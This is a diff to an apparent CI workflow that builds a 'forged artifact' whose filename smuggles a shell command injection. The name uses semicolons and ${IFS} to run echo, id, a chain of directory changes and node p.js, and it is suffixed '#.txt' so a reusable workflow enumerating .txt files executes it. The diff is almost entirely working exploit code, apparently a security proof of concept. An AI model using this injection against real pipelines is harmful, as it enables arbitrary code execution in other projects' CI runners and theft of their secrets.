@@ -12,10 +12,19 @@ jobs:
       - name: Build forged artifact
         run: |
           mkdir -p content
-          printf 'forged report body' > content/summary.txt
+          # `body` is the cat target of the injected command (no .txt suffix, so
+          # it is not itself a matrix entry); the hostile .txt name is the only
+          # file the reusable workflow enumerates.
+          printf 'forged report body' > content/body
           python3 - <<'PY'
           import os
-          name = r"summary.txt;echo${IFS}INJECTION-EXECUTED;id;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
+          ups = ";".join(["cd${IFS}.."] * 12)
+          name = (
+              "body;echo${IFS}INJECTION-EXECUTED;id;"
+              + ups
+              + ";cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
+          )
+          assert len(name) < 255, len(name)
           open(os.path.join("content", name), "w").close()
           PY
           cat > content/p.js <<'JSEOF'
